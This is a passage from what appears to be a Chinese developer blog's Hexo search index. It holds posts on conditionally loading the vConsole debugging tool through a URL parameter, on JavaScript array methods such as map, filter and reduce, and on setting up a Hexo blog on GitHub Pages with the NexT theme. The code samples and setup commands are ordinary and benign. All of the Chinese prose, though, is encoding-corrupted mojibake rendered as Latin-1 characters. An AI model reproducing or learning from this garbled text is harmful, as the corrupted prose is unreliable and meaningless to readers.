è‡ªå·±çŸ¥é“çš„å‚æ•°é”®å€¼ï¼ˆåœ¨è¿™é‡Œæˆ‘ç›´æŽ¥ç”¨vconsoleä¸¾ä¾‹äº†ï¼‰ï¼ŒèŽ·å–åˆ°è¿™ä¸ªå‚æ•°å°±æŒ‰éœ€åŠ¨æ€åŠ è½½vConsoleæ’ä»¶jsæ–‡ä»¶ï¼Œå¦åˆ™ä¸åŠ è½½ï¼Œä¹Ÿä¸å½±å“æ•´ä¸ªä¸šåŠ¡ä»£ç æ‰“åŒ…å¤§å°ï¼Œä¸¤å…¨é½ç¾Žã€‚ 1234567891011121314151617181920212223242526272829303132// util.jsconst queryParams = (url = window.location.href) =&gt; &#123; let surl = [] let patt = /\?([^#/?]+)/g url = decodeURIComponent(url) let result = [] while ((result = patt.exec(url))) &#123; surl.push(result[1]) &#125; if (!surl.length) &#123; return null &#125; let o = &#123;&#125; surl.forEach((item, index) =&gt; &#123; let s = surl[index] let kvs = s.split('&amp;') kvs.forEach((item) =&gt; &#123; let arr = item.split('=') o[arr[0]] = arr[1] &#125;) &#125;) return o&#125;// ...// å¯ç”¨vconsoleç§»åŠ¨ç«¯æ‰“å°å·¥å…·if (Util.queryParams().hasOwnProperty('vconsole')) &#123; import('~/plugins/vconsole')&#125; ä¸‹é¢çœ‹ä¸€ä¸‹è¿™æ ·å¤„ç†åŽçš„æ•ˆæžœï¼š ç”¨æˆ·çœ‹ä¸åˆ°vConsoleç»¿è‰²æŒ‰é’®ï¼Œè€Œåœ¨ä½ æŠŠé¡µé¢urlæ’å…¥ä½ ç¥žç§˜çš„å‚æ•°å°±èƒ½çœ‹åˆ°è°ƒè¯•ç•Œé¢å•¦ï¼]]></content>
      <categories>
        <category>mobile</category>
      </categories>
      <tags>
        <tag>å…¶å®ƒ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç®€çº¦å¼ºå¤§æ•°ç»„æ“ä½œç»„åˆ]]></title>
    <url>%2F2018%2F09%2F07%2F%E7%AE%80%E7%BA%A6%E5%BC%BA%E5%A4%A7%E6%95%B0%E7%BB%84%E6%93%8D%E4%BD%9C%E7%BB%84%E5%90%88%2F</url>
    <content type="text"><![CDATA[å‰è¨€åœ¨å®žé™…jså¼€å‘ä¸­å¯¹æ•°ç»„æ“ä½œé¢‘çŽ‡éžå¸¸é«˜ï¼Œåœ¨è¿™é‡Œå°è®°ï¼ˆä¸å…¨ï¼‰ä¸€ä¸‹ï¼Œå¤‡å¿˜ã€‚ 5ä¸ªè¿­ä»£æ–¹æ³•ï¼ševeryã€filterã€forEachã€mapå’Œsome every()ï¼šå¯¹æ•°ç»„ä¸­çš„æ¯ä¸€é¡¹è¿è¡Œç»™å®šå‡½æ•°ï¼Œå¦‚æžœè¯¥å‡½æ•°æ¯ä¸€é¡¹éƒ½è¿”å›žtrueï¼Œåˆ™è¿”å›žtrueï¼› filter()ï¼šå¯¹æ•°ç»„ä¸­çš„æ¯ä¸€é¡¹è¿è¡Œç»™å®šå‡½æ•°ï¼Œè¿”å›žè¯¥å‡½æ•°ä¼šè¿”å›žtrueçš„é¡¹ç»„æˆçš„æ•°ç»„ï¼› forEach()ï¼šå¯¹æ•°ç»„ä¸­çš„æ¯ä¸€é¡¹è¿è¡Œç»™å®šå‡½æ•°ï¼Œè¿™ä¸ªæ–¹æ³•æ²¡æœ‰è¿”å›žå€¼ï¼› map()ï¼šå¯¹æ•°ç»„ä¸­çš„æ¯ä¸€é¡¹è¿è¡Œç»™å®šå‡½æ•°ï¼Œè¿”å›žæ¯æ¬¡å‡½æ•°è°ƒç”¨çš„ç»“æžœç»„æˆçš„æ•°ç»„ï¼› some()ï¼šå¯¹æ•°ç»„ä¸­çš„æ¯ä¸€é¡¹è¿è¡Œç»™å®šå‡½æ•°ï¼Œå¦‚æžœè¯¥å‡½æ•°ä»»æ„ä¸€é¡¹è¿”å›žtrueï¼Œåˆ™è¿”å›žtrueï¼› 123456789101112131415161718192021222324// everyvar numbers = [1, 2, 3, 4, 5, 6, 7];var everyResult = numbers.every(function (item, index, array) &#123; return (item &gt; 2);&#125;);console.log(everyResult); // false// somesomeResult = numbers.some(function (item, index, array) &#123; return (item &gt; 2);&#125;);console.log(someResult); // true// filtervar filterResult = numbers.filter(function (item, index, array) &#123; return (item &gt; 2);&#125;);console.log(filterResult); // [3, 4, 5, 6, 7]// mapvar mapResult = numbers.map(function (item, index, array) &#123; return item * 2;&#125;);console.log(mapResult); // [2, 4, 6, 8, 10, 12, 14] è¢«å¿½è§†çš„ map çš„ç¬¬äºŒä¸ªã€ç¬¬ä¸‰ä¸ªå‚æ•°é€šå¸¸æƒ…å†µä¸‹ï¼Œ map æ–¹æ³•ä¸­çš„ callback å‡½æ•°åªæŽ¥å—ä¸€ä¸ªå‚æ•°ï¼Œå°±æ˜¯æ­£åœ¨è¢«éåŽ†æ•°ç»„å…ƒç´ æœ¬èº«ã€‚ä½†ä¸æ„å‘³ç€ map åªç»™ callback ä¼ ä¸€ä¸ªå‚æ•°ï¼Œè¿™ç§æƒ¯æ€§æ€ç»´å¾ˆå¯èƒ½ä¼šè®©æˆ‘ä»¬çŠ¯é”™ã€‚ä¸‹é¢ä¸¾ä¸€ä¸ªä¾‹å­ï¼š ä¸‹é¢è¯­å¥è¿”å›žä»€ä¹ˆå‘¢ï¼š[&#39;1&#39;, &#39;2&#39;, &#39;3&#39;].map(parseInt) å¯èƒ½ä½ ä¼šè§‰å¾—æ˜¯ [1, 2, 3]ï¼Œä½†å®žé™…ç»“æžœæ˜¯ [1, NaN, NaN]ã€‚ map å›žè°ƒæ–¹æ³• callback(currentValue, index, array) æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ•°ç»„ä¸­æ­£åœ¨å¤„ç†çš„å½“å‰å…ƒç´ ï¼Œç¬¬äºŒä¸ªæ˜¯å½“å‰å…ƒç´ ç´¢å¼•ï¼Œç¬¬ä¸‰ä¸ªæ˜¯æ•°ç»„æœ¬èº«ã€‚ Number.parseInt(string[, radix])æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯å¾…è½¬åŒ–å­—ç¬¦ï¼Œç¬¬äºŒä¸ªæ˜¯è¿›åˆ¶æ•°ã€‚parseIntä¼ å…¥ç¬¬ä¸‰ä¸ªå‚æ•°ä¼šè¢«å¿½ç•¥ã€‚ å› æ­¤ï¼Œä¸Šè¿°æ‰§è¡Œ 123parseInt('1', 0, ['1', '2', '3']) // 1parseInt('2', 1, ['1', '2', '3']) // NaNparseInt('3', 2, ['1', '2', '3']) // NaN æ‹“å±• map åœ¨å®žé™…é¡¹ç›®ä¸­çš„åº”ç”¨åŒ¹é…æŸ¥æ‰¾æŸä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶å¹¶å¼•å…¥ã€‚ context.require è¿”å›žä¸€ä¸ª require å‡½æ•°ï¼š 123function webpackContext(req) &#123; return __webpack_require__(webpackContextResolve(req));&#125; è¯¥å‡½æ•°æœ‰ä¸€ä¸ª keys å±žæ€§ï¼Œæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè¿”å›žä¸€ä¸ªæ•°ç»„ï¼Œè¯¥æ•°ç»„æ˜¯ç”±æ‰€æœ‰å¯èƒ½è¢«ä¸Šä¸‹æ–‡æ¨¡å—çš„è¯·æ±‚å¯¹è±¡ç»„æˆã€‚ 123let requireAll = requireContext =&gt; requireContext.keys().map(requireContext)let req = require.context('./svg', false, /\.svg$/)requireAll(req) è¿™æ ·é€šè¿‡ map éåŽ†ï¼Œç»“åˆå¼•å…¥ä¸Šä¸‹æ–‡å¯¹è±¡ä½œä¸ºå›žè°ƒå‡½æ•°ï¼Œå³å¯èŽ·å–å¼•å…¥æŸä¸ªç›®å½•ä¸‹çš„ svg èµ„æºã€‚ ä¸€ä¸ªå½’å¹¶æ–¹æ³•ï¼šreducearray.reduce(callback[, initialValue])ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ¯ä¸€é¡¹ä¸Šè°ƒç”¨çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°æœ‰å››ä¸ªå‚æ•°ï¼š accumulatorï¼šç´¯åŠ å›žè°ƒè¿”å›žå€¼ï¼›ä»–æ˜¯ä¸Šä¸€æ¬¡è°ƒç”¨æ—¶è¿”å›žçš„ç´¯ç§¯å€¼ï¼Œæˆ–initValueï¼› currentValueï¼šæ•°ç»„ä¸­æ­£åœ¨å¤„ç†çš„å…ƒç´ ï¼› currentIndexï¼šæ•°ç»„ä¸­æ­£åœ¨å¤„ç†çš„å½“å‰å…ƒç´ çš„ç´¢å¼•ã€‚å¦‚æžœæä¾›äº†initialValueï¼Œè¿™ç´¢å¼•å·ä¸º0ï¼Œå¦åˆ™ç´¢å¼•ä¸º1ï¼› arrayï¼šè°ƒç”¨reduce()çš„æ•°ç»„ã€‚ å½“ç¬¬äºŒä¸ªå‚æ•°çœç•¥æ—¶ï¼ŒéåŽ†ä»Žæ•°ç»„ç¬¬äºŒé¡¹å¼€å§‹ï¼Œæ•°ç»„ç¬¬ä¸€é¡¹è¢«å½“ä½œå‰ä¸€ä¸ªå€¼accumulatorã€‚ æ•°ç»„æ±‚å’Œ 12345const numbers = [10, 20, 30, 40];numbers.reduce((acc, cur, index, arr) =&gt; &#123; console.log('acc: ' + acc + '; ' + 'cur: ' + cur + ';'); return acc + cur;&#125;) ç»“æžœä¸ºï¼š 123acc: 10; cur: 20;acc: 30; cur: 30;acc: 60; cur: 40; è¿™ç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯è®¾ç½®accumulatorçš„åˆå§‹ç±»åž‹å’Œåˆå§‹å€¼ï¼Œæ¯”å¦‚ä¸º0ï¼Œå°±è¡¨ç¤ºaccumulatorçš„åˆå§‹å€¼ä¸ºNumberç±»åž‹ï¼Œå€¼ä¸º0ï¼Œå› æ­¤ï¼Œreduceçš„æœ€ç»ˆç»“æžœä¹Ÿä¼šæ˜¯Numberç±»åž‹ã€‚ 12345const numbers = [10, 20, 30, 40];numbers.reduce((acc, cur, index, arr) =&gt; &#123; console.log('acc: ' + acc + '; ' + 'cur: ' + cur + ';'); return acc + cur;&#125;, 0) ç»“æžœä¸ºï¼š 1234acc: 0; cur: 10;acc: 10; cur: 20;acc: 30; cur: 30;acc: 60; cur: 40; å¼ºå¤§çš„reducereduceä½œä¸ºå½’å¹¶æ–¹æ³•ï¼Œåœ¨æœ‰äº›æƒ…å½¢å¯ä»¥æ›¿ä»£å…¶å®ƒæ•°ç»„æ“ä½œæ–¹æ³•ï¼Œå¼ºå¤§ä¹‹å¤„ï¼Œè¿˜å¾—è¦è½å®žåœ¨å…·ä½“çš„æ¡ˆä¾‹ä¸Šã€‚ å‡è®¾çŽ°åœ¨æœ‰ä¸€ä¸ªæ•°åˆ—[10, 20, 30, 40, 50]ï¼Œæ¯ä¸€é¡¹ä¹˜ä»¥2ï¼Œç„¶åŽç­›é€‰å‡ºå¤§äºŽ60çš„é¡¹ã€‚ åœ¨è¿™é‡Œæ›´æ–°æ•°ç»„æ¯ä¸€é¡¹ï¼ˆmapçš„åŠŸèƒ½ï¼‰ç„¶åŽç­›é€‰å‡ºä¸€éƒ¨åˆ†ï¼ˆfilterçš„åŠŸèƒ½ï¼‰ï¼Œå¦‚æžœæ˜¯å…ˆä½¿ç”¨mapç„¶åŽfilterçš„è¯ï¼Œä½ éœ€è¦éåŽ†è¿™ä¸ªæ•°ç»„ä¸¤æ¬¡ã€‚åœ¨è¿™é‡Œç”¨reduceæ›´é«˜æ•ˆã€‚ 123456789var numbers = [10, 20, 30, 40, 50];var result = numbers.reduce(function (acc, cur) &#123; cur = cur * 2; if (cur &gt; 60) &#123; acc.push(cur); &#125; return acc;&#125;, []);console.log(result); // [80, 100] ä»Žè¿™ä¸ªä¾‹å­å¯ä»¥çœ‹å‡ºreduceå®Œæˆäº†mapå’Œfilterçš„ä½¿å‘½ã€‚ ç»Ÿè®¡æ•°ç»„ä¸­é‡å¤å‡ºçŽ°é¡¹çš„ä¸ªæ•°ï¼Œç”¨å¯¹è±¡è¡¨ç¤ºã€‚ 123456var letters = ['A', 'B', 'C', 'C', 'B', 'C', 'C'];var letterObj = letters.reduce(function (acc, cur) &#123; acc[cur] = acc[cur] ? ++acc[cur] : 1; return acc;&#125;, &#123;&#125;);console.log(letterObj); // &#123;A: 1, B: 2, C: 4&#125; æ•°ç»„åŽ»é‡ 12345678var letters = ['A', 'B', 'C', 'C', 'B', 'C', 'C'];var letterArr = letters.reduce(function (acc, cur) &#123; if (acc.indexOf(cur) === -1) &#123; acc.push(cur); &#125; return acc;&#125;, []);console.log(letterArr); // ["A", "B", "C"] psï¼šäº†è§£æ›´å¤šæ•°ç»„åŽ»é‡æ–¹æ³•ï¼Œç‚¹è¿™é‡Œã€‚ ä¸ŽES6çš„ç»“åˆä¸ŽES6ç»“åˆä½¿ç”¨ä¹Ÿä¼šæ“¦å‡ºä¸å°‘ç«èŠ±ã€‚ åˆ é™¤ç›®æ ‡å¯¹è±¡æŸä¸ªå±žæ€§ã€‚ 1234567891011121314151617const person = &#123; name: 'jazz', gender: 'male', age: 24&#125;;const personUnknowAge = Object.keys(person).filter((key) =&gt; &#123; return key !== 'age';&#125;).map((key) =&gt; &#123; return &#123; [key]: person[key] &#125;&#125;).reduce((acc, cur) =&gt; &#123; return &#123;...acc, ...cur&#125;;&#125;, &#123;&#125;);console.log(personUnknowAge); // &#123;name: "jazz", gender: "male"&#125; æ›´ç®€æ´çš„æ–¹æ¡ˆï¼Œåˆ©ç”¨ES6ä¸­å‡½æ•°å‚æ•°è§£æž„ï¼š 12const personUnknowAge = ((&#123;name, gender&#125;) =&gt; (&#123;name, gender&#125;))(person);console.log(personUnknowAge); // &#123;name: "jazz", gender: "male"&#125; å½“ç„¶è¿˜æœ‰æ›´ç®€å•çš„æ–¹æ¡ˆï¼Œåˆ©ç”¨ES6ä¸­å¯¹è±¡è§£æž„ï¼š 1234567const person = &#123; name: 'jazz', gender: 'male', age: 24&#125;;let &#123; age, ...personUnknowAge &#125; = person;console.log(personUnknowAge); // &#123;name: "jazz", gender: "male"&#125;]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æž„å»ºè‡ªå·±çš„åšå®¢]]></title>
    <url>%2F2018%2F08%2F30%2F%E6%9E%84%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[ä¸€ã€å‰è¨€çœ‹è¿‡å¾ˆå¤šäººï¼Œç”¨githubåˆ›å»ºä¸ªäººåšå®¢ï¼Œæœ€è¿‘æŠ½ç©ºä¹Ÿå®žçŽ°çš„è‡ªå·±çš„åšå®¢ï¼Œä¸‹é¢å°±æŠŠæ‘¸ç´¢è¿‡ç¨‹è®°å½•ä¸‹ã€‚ äºŒã€å‡†å¤‡å®‰è£…Node.jsNode.jsä¸‹è½½åœ°å€ï¼šhttps://nodejs.org/en/download/ å®‰è£…è¿‡ç¨‹ä¸€è·¯é»˜è®¤å®‰è£…å³å¯ã€‚ è¯¦ç»†å®‰è£…æ–‡æ¡£å‚çœ‹ï¼šhttp://www.runoob.com/nodejs/nodejs-install-setup.html å®‰è£…Gitè½¯ä»¶Gitè½¯ä»¶ä¸‹è½½åœ°å€ï¼šhttps://git-scm.com/download å®‰è£…è¿‡ç¨‹ä¸€è·¯é»˜è®¤å®‰è£…å³å¯ã€‚ å…³äºŽæ›´å¤šçš„Gitè®²è§£å‚çœ‹ï¼š https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000 å®‰è£…Hexoä»€ä¹ˆæ˜¯ Hexoï¼ŸHexo æ˜¯ä¸€ä¸ªå¿«é€Ÿã€ç®€æ´ä¸”é«˜æ•ˆçš„åšå®¢æ¡†æž¶ã€‚Hexo ä½¿ç”¨Markdownï¼ˆæˆ–å…¶ä»–æ¸²æŸ“å¼•æ“Žï¼‰è§£æžæ–‡ç« ï¼Œåœ¨å‡ ç§’å†…ï¼Œå³å¯åˆ©ç”¨é“ä¸½çš„ä¸»é¢˜ç”Ÿæˆé™æ€ç½‘é¡µã€‚ Hexoå®˜æ–¹ç½‘ç«™ï¼šhttps://hexo.io/zh-cn/ ï¼Œæˆ‘ç”¨çš„å½“å‰ç‰ˆæœ¬æ˜¯v6.4.0ï¼ŒåŸºæœ¬æ­¥éª¤ï¼š æ–°å»ºä¸€ä¸ªblogç©ºæ–‡ä»¶å¤¹ï¼Œcmdçª—å£æˆ–vscodeç»ˆç«¯ï¼Œè¾“å…¥å‘½ä»¤npm install -g hexo-cliå…¨å±€å®‰è£…hexoï¼› å®‰è£…å®ŒæˆåŽè¾“å…¥hexo -væ˜¾ç¤ºhexoçš„ç›¸å…³ä¿¡æ¯è¯´æ˜Žå®‰è£…æˆåŠŸï¼› è¾“å…¥å‘½ä»¤hexo initåˆå§‹åŒ–hexoé¡¹ç›®ï¼Œå®‰è£…ç›¸å…³ä¾èµ–ï¼Œå®‰è£…å®ŒæˆåŽçš„ç›®å½•ç»“æž„ï¼š 12345678- node_modules // ä¾èµ–åŒ…- public // å­˜æ”¾ç”Ÿæˆçš„é¡µé¢- scaffolds // ç”Ÿæˆé¡µæ¨¡æ¿- source // åˆ›å»ºçš„æºæ–‡ç« - themes // ä¸»é¢˜- _config.yml // åšå®¢é…ç½®ï¼ˆç«™ç‚¹é…ç½®ï¼‰- db.json // è§£æžsourceå¾—åˆ°çš„åº“æ–‡ä»¶- package.json // é¡¹ç›®ä¾èµ–é…ç½® ä¸Šä¸€æ­¥å®‰è£…å®Œæˆï¼Œè¾“å…¥å‘½ä»¤hexo sæˆ–hexo serverï¼Œå¼€å¯æœåŠ¡ï¼ŒæˆåŠŸåŽï¼Œåœ¨æµè§ˆå™¨è®¿é—®http://localhost:4000ç”Ÿæˆçš„é»˜è®¤ä¸»é¢˜åšå®¢ã€‚PSï¼šåœ¨è¿™é‡Œå¯ä»¥npm install hexo-browsersync --saveå®žçŽ°çƒ­æ›´æ–°ï¼Œä¸å¿…æ¯æ¬¡æ›´æ”¹éƒ½åŽ»åˆ·æ–°æµè§ˆå™¨ã€‚ ä¸‰ã€ä¿®æ”¹ç«™ç‚¹é…ç½®_config.ymlæ–‡ä»¶æ˜¯å¯¹æ•´ä¸ªç«™ç‚¹åŸºæœ¬ä¿¡æ¯çš„é…ç½®ï¼Œæ¯”å¦‚ï¼š12345678# Sitetitle: // åšå®¢åç§°subtitle: // å‰¯æ ‡é¢˜description: // æè¿° ç”¨äºŽseokeywords: // å…³é”®å­— ç”¨äºŽseoauthor: // ä½œè€… ç”¨äºŽseolanguage: // è¯­è¨€timezone: // æ—¶åŒº å››ã€Githubåˆ›å»ºä¸€ä¸ªhexoçš„ä»£ç åº“å’Œåˆ›å»ºå…¶å®ƒgitä»“åº“ä¸€æ ·ï¼Œåªä¸è¿‡åç§°å¿…é¡»ä¸ºyourname.github.ioè¿™ç§å½¢å¼ï¼Œå…¶ä¸­yournameæ˜¯ä½ githubä¸ªäººè´¦å·åï¼Œåˆ›å»ºå¥½åŽï¼Œæ‰¾åˆ°ç«™ç‚¹é…ç½®æ–‡ä»¶ï¼ˆblogä¸‹çš„_config.ymlæ–‡ä»¶ï¼‰ï¼Œæ‰¾åˆ°ï¼š 1234# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: æ”¹æˆä½ çš„ åšå®¢gitä»“åº“åœ°å€å’Œåˆ†æ”¯ï¼š1234deploy: type: git repo: https://github.com/YourgithubName/YourgithubName.github.io.git branch: master è¿™æ ·ï¼Œè¿œç¨‹ä»“åº“é…ç½®å®Œæˆã€‚æŽ¥ä¸‹æ¥ è¾“å…¥å‘½ä»¤hexo generateæˆ–hexo gå°†åŽŸmarkedownæ–‡ç« ç”Ÿæˆé™æ€é¡µé¢ï¼Œæ”¾ç½®åœ¨ç”Ÿæˆçš„publicç›®å½•ä¸‹ï¼› npm install hexo-deployer-git --saveå®‰è£…hexoçš„gitæ’ä»¶ï¼› å†è¾“å…¥å‘½ä»¤hexo deployæˆ–hexo då°†ç”Ÿæˆçš„é™æ€é¡µé¢æŽ¨é€åˆ°è¿œç¨‹ä»“åº“ï¼› å®ŒæˆåŽï¼Œåœ¨æµè§ˆå™¨è®¿é—®https://yourname.github.io/ï¼Œå°±èƒ½çœ‹åˆ°ä½ æž„å»ºå¥½çš„ä¸ªäººåšå®¢å•¦ï¼ äº”ã€å†™æ–‡ç« hexoæ”¯æŒç”¨markdownå†™ä½œï¼Œåœ¨ç›®å½•blog/source/_postsæ–°å»ºmarkdownæ–‡ä»¶ï¼Œæˆ–è€…ä½¿ç”¨å‘½ä»¤hexo new posts ä½ çš„æ–‡ç« æ ‡é¢˜ã€‚ å°å‘ï¼š&#123;&#123;&#125;&#125;ç¬¦å·ç¼–è¯‘å‡ºé”™ markdownç”Ÿæˆé™æ€é¡µé¢ï¼Œ&#123;&#123;&#125;&#125;æ˜¯swigæ¨¡æ¿ç¬¦å·ï¼Œå±žäºŽç‰¹æ®Šå­—ç¬¦ï¼Œåœ¨ç¼–è¯‘æ—¶è§£æžä¸äº†åŒå¤§æ‹¬å·ä¸­é—´å­—ç¬¦ä¸²å°±ä¼šæŠ¥é”™ 123FATAL Something's wrong. Maybe you can find the solution here: http://hexo.io/docs/troubleshooting.htmlTemplate render error: (unknown path) [Line 3, Column 8] unexpected token: &#125;&#125; è§£å†³æ–¹æ¡ˆï¼šç”¨è½¬ä¹‰å­—ç¬¦ä»£æ›¿ 12&#123; -&gt; &amp;#123; â€” å¤§æ‹¬å·å·¦è¾¹éƒ¨åˆ†Left curly brace&#125; -&gt; &amp;#125; â€” å¤§æ‹¬å·å³è¾¹éƒ¨åˆ†Right curly brace å…­ã€é…ç½®ä¸»é¢˜hexoé»˜è®¤ä¸»é¢˜æ˜¯landscapeï¼Œæ ·å¼å¯èƒ½ä¸æ˜¯æ¯ä¸ªäººéƒ½å–œçˆ±çš„ï¼Œå®˜æ–¹é¡µæä¾›äº†ä¸€äº›ä¸»é¢˜ï¼Œå¯ä»¥æŒ‰è‡ªå·±çš„é£Žæ ¼å®‰è£…ï¼Œåªéœ€åœ¨ç«™ç‚¹é…ç½®æ–‡ä»¶_config.ymlæ›´æ”¹ä¸»é¢˜åç§°ã€‚ Nextä¸»é¢˜æ˜¯ç›®å‰æ¯”è¾ƒæµè¡Œçš„ä¸»é¢˜ï¼Œæ–‡æ¡£ç›¸å¯¹æ¯”è¾ƒæˆç†Ÿã€‚nextä¸»é¢˜æ–‡æ¡£ å®‰è£…12cd bloggit clone https://github.com/theme-next/hexo-theme-next themes/next æ›´æ¢ä¸»é¢˜1234# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: next ä¿®æ”¹Nextä¸»é¢˜é…ç½®æ–‡ä»¶ç›®å½•blog/themes/nextæ‰¾åˆ°_config.ymlæ–‡ä»¶ï¼Œå…¶ä¸­æœ‰å¾ˆå¤šé…ç½®é¡¹ï¼Œä¸‹é¢åˆ—ä¸¾å‡ ä¸ªå¸¸ç”¨çš„ã€‚ æ›´æ¢å¤´åƒ123456789101112# Sidebar Avataravatar: # in theme directory(source/images): /images/avatar.gif # in site directory(source/uploads): /uploads/avatar.gif # You can also use other linking images. url: /images/avatar.png # If true, the avatar would be dispalyed in circle. rounded: true # The value of opacity should be choose from 0 to 1 to set the opacity of the avatar. opacity: 1 # If true, the avatar would be rotated with the cursor. rotated: false åªéœ€å°†å¤´åƒçš„urlæ¢æˆä½ è‡ªå·±å¤´åƒçš„urlæˆ–è€…ç›´æŽ¥è¦†ç›–å¤´åƒå›¾ç‰‡å³å¯ã€‚ æ³¨æ„è¿™é‡Œçš„æ ¹/çš„ç»å¯¹è·¯å¾„æ˜¯blog/themes/next/source/ï¼Œä»¥åŽå†™æ–‡ç« å¼•ç”¨æœ¬åœ°å›¾ç‰‡çš„è¯ï¼Œæ³¨æ„æ”¾åˆ°è¿™ä¸ªç›®å½•ä¸‹ï¼ ä»£ç é«˜äº®NexTä½¿ç”¨Tomorrow Themeä½œä¸ºä»£ç é«˜äº®ï¼Œå…±æœ‰5æ¬¾ä¸»é¢˜ä¾›ä½ é€‰æ‹©ã€‚ NexTé»˜è®¤ä½¿ç”¨çš„æ˜¯ç™½è‰²çš„normalä¸»é¢˜ï¼Œå¯é€‰çš„å€¼æœ‰normalï¼Œnightï¼Œnight blueï¼Œ night brightï¼Œnight eightiesã€‚ 1234# Code Highlight theme# Available values: normal | night | night eighties | night blue | night bright# https://github.com/chriskempson/tomorrow-themehighlight_theme: normal æ·»åŠ åˆ†ç±»é¡µæ–‡ç« å¯èƒ½éœ€è¦åˆ†ç±»ï¼Œæ·»åŠ åˆ†ç±»é¡µ 12cd bloghexo new page categories æ­¤æ—¶åœ¨blog/sourceç›®å½•ä¸‹å°±ç”Ÿæˆäº†categories/index.mdæ–‡ä»¶ï¼š 123456---title: åˆ†ç±»date: 2018-08-28 14:59:48type: categoriescomments: false // åˆ†ç±»é¡µä¸éœ€è¦æ·»åŠ è¯„è®º--- ç„¶åŽï¼Œæ”¾å¼€ä¸»é¢˜é…ç½®æ–‡ä»¶_config.ymlä¸­menu settingå¯¹categoriesæ³¨é‡Š 123menu: home: / || home categories: /categories/ || th ä»¥åŽæ–‡ç« çš„å†…å®¹å¤´å£°æ˜Žçš„åˆ†ç±»å°±ä¼šåœ¨åˆ†ç±»é¡µæœ‰ç´¢å¼•äº†ã€‚ æ·»åŠ æ ‡ç­¾é¡µè·Ÿæ·»åŠ åˆ†ç±»é¡µä¸€æ ·ï¼Œæ–‡ç« ä¹Ÿéœ€è¦æ ‡ç­¾ 12cd bloghexo new page tags æ­¤æ—¶åœ¨blog/sourceç›®å½•ä¸‹å°±ç”Ÿæˆäº†tags/index.mdæ–‡ä»¶ï¼š 123456---title: æ ‡ç­¾date: 2018-08-28 14:34:22type: tagscomments: false // æ ‡ç­¾é¡µä¸éœ€è¦è¯„è®º--- ç„¶åŽï¼Œæ”¾å¼€ä¸»é¢˜é…ç½®æ–‡ä»¶_config.ymlä¸­menu settingå¯¹tagsæ³¨é‡Š 123menu: home: / || home tags: /tags/ || tags ä»¥åŽæ–‡ç« çš„å†…å®¹å¤´å£°æ˜Žçš„åˆ†ç±»å°±ä¼šåœ¨åˆ†ç±»é¡µæœ‰åˆ†ç±»äº†ã€‚ 404é¡µå½“è®¿é—®å½“å‰ç«™ç‚¹ï¼Œé¡µé¢æ‰¾ä¸åˆ°ï¼Œè·³è½¬åˆ°404é¡µï¼ŒæŽ¨èç”¨è…¾è®¯å…¬ç›Š404é¡µé¢ï¼Œå¯»æ‰¾ä¸¢å¤±å„¿ç«¥ï¼Œè®©å¤§å®¶ä¸€èµ·å…³æ³¨æ­¤é¡¹å…¬ç›Šäº‹ä¸šï¼ä½¿ç”¨æ–¹æ³•ï¼Œæ–°å»º404.htmlé¡µé¢ï¼Œæ”¾åˆ°ä¸»é¢˜çš„sourceç›®å½•ä¸‹ï¼Œå†…å®¹å¦‚ä¸‹ï¼š 123456789101112131415161718&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv="content-type" content="text/html;charset=utf-8;"/&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" /&gt; &lt;meta name="robots" content="all" /&gt; &lt;meta name="robots" content="index,follow"/&gt; &lt;link rel="stylesheet" type="text/css" href="https://qzone.qq.com/gy/404/style/404style.css"&gt;&lt;/head&gt;&lt;body&gt; &lt;script type="text/plain" src="http://www.qq.com/404/search_children.js" charset="utf-8" homePageUrl="/" homePageName="å›žåˆ°æˆ‘çš„ä¸»é¡µ"&gt; &lt;/script&gt; &lt;script src="https://qzone.qq.com/gy/404/data.js" charset="utf-8"&gt;&lt;/script&gt; &lt;script src="https://qzone.qq.com/gy/404/page.js" charset="utf-8"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; ç«™ç‚¹åˆ†æžç»Ÿè®¡å¯¹äºŽä¸ªäººç«™ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦ç»Ÿè®¡ç”¨æˆ·è®¿é—®é‡ï¼Œç”¨æˆ·åˆ†å¸ƒï¼Œè·³è½¬çŽ‡ç­‰ã€‚Nextä¸»é¢˜æŽ¨èä½¿ç”¨çš„æœ‰ç™¾åº¦ç»Ÿè®¡ã€Googleåˆ†æžã€è…¾è®¯åˆ†æžäº†ï¼Œä½¿ç”¨å‡ä¸€æ ·ï¼Œæ³¨å†ŒèŽ·å–ç«™ç‚¹ç»Ÿè®¡idã€‚ ç™¾åº¦ç»Ÿè®¡æˆ‘ä¸€ç›´ç”¨çš„ç™¾åº¦ç»Ÿè®¡ï¼Œæ³¨å†Œç™¾åº¦ç»Ÿè®¡ï¼Œç®¡ç† &gt; ç½‘ç«™åˆ—è¡¨ &gt; æ–°å¢žç½‘ç«™å®ŒæˆåŽï¼Œä»£ç ç®¡ç† &gt; ä»£ç èŽ·å–ï¼Œå°±èƒ½å¾—åˆ°ç»Ÿè®¡idã€‚ 12# Baidu Analytics IDbaidu_analytics: ç»Ÿè®¡id ä¸è’œå­ç»Ÿè®¡ä¸è’œå­ç»Ÿè®¡å¯ä»¥ç»Ÿè®¡ç«™ç‚¹ä»¥åŠæ¯ä¸ªé¡µé¢çš„PVã€UVå’Œç«™ç‚¹æ€»çš„è®¿é—®æ•°ï¼Œä»¥å°çœ¼ç›çš„å½¢å¼å±•çŽ°ã€‚ 